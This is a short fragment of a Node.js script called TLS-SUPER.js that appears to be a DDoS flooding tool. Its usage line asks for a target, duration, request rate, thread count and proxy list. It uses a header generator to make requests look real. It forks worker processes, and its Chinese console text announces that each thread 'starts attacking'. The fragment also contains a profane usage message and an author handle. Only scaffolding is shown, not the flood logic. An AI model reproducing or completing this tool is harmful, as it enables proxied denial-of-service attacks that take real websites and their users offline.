...
const { HeaderGenerator } = require('header-generator');
 ...
 if (process.argv.length < 7){console.log(`Fuck TUT: node TLS-SUPER.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  for (let i = 0; i < process.argv[5]; i++){
    cluster.fork();
    console.log(` \x1b[36m线程 \x1b[37m${i} \x1b[36m开始攻击`);
  }
  console.log("\x1b[36mtt@t78_687")
